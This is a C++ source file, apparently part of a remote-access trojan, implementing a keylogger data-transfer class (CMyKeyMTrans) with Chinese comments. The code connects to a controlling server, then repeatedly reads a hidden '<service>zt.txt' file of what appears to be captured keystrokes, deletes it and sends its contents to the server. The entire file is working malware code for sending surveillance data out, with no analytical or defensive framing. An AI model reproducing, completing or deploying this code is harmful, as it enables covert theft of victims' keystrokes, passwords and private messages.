// MyKeyMonTrans.cpp: implementation of the CMyKeyMTrans class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "MyKeyMTrans.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
extern HINSTANCE ghInstance;

CMyKeyMTrans::CMyKeyMTrans()
{
	hExitEvent = CreateEvent(NULL, TRUE, FALSE, NULL);	
}

CMyKeyMTrans::~CMyKeyMTrans()
{
	CloseHandle(hExitEvent);
}

void CMyKeyMTrans::CheckSocket()
{
	while(1)
	{
		char ch = 0x00;
		if(!RecvData(&ch, 1))
		{
			break;
		}
	}
	SetEvent(hExitEvent);
}

void CMyKeyMTrans::CheckSocketThread(LPVOID lPvoid)
{
	CMyKeyMTrans* pThis = (CMyKeyMTrans*) lPvoid;
	pThis->CheckSocket();
}

//控制线程
BOOL CMyKeyMTrans::StartWork(PSDLLINFO m_DllInfo)
{
	//连接到服务器
	if(!Create(WM_CONNECT_GET_KEY, m_DllInfo))
	{
		return FALSE;
	}

	//保存文件名称
	char m_ModuleFileName[256] = {0};
	GetModuleFileName(ghInstance, m_ModuleFileName, 255);
	char* pStart = strrchr(m_ModuleFileName, '\\');
	*pStart = 0x00;
	wsprintf(pStart, "\\%szt.txt", m_DllInfo.m_ServiceName);

	//排斥量名称
	char m_WaitMetuxName[256] = {0};
	wsprintf(m_WaitMetuxName, "%szt", m_DllInfo.m_ServiceName);
	HANDLE hKeyWaitMetux = OpenMutex(SYNCHRONIZE, FALSE, m_WaitMetuxName);
	if(hKeyWaitMetux == NULL)
	{
		return FALSE;
	}

	//启动连接监控线程
	_beginthread(CheckSocketThread, 0, this);

	while(WaitForSingleObject(hExitEvent, 50) == WAIT_TIMEOUT)
	{
		BYTE* pData = NULL;
		DWORD nReadLen = 0;
		WaitForSingleObject(hKeyWaitMetux, 0xffffffff);
		HANDLE hFile = CreateFile(m_ModuleFileName,  GENERIC_READ,  FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if(hFile != INVALID_HANDLE_VALUE)
		{
			DWORD nLen = GetFileSize(hFile, NULL);
			if(nLen > 0)
			{
				pData = new BYTE[nLen];
				ReadFile(hFile, pData, nLen, &nReadLen, NULL);
			}
			CloseHandle(hFile);
			DeleteFile(m_ModuleFileName);
		}
		ReleaseMutex(hKeyWaitMetux);
		if(nReadLen > 0 && pData != NULL)
		{
			if(!SendDataWithCmd(pData, nReadLen, 0))
			{
				delete [] pData;
				break;
			}
			delete [] pData;
		}
	}
	CloseHandle(hKeyWaitMetux);
	return TRUE;
}

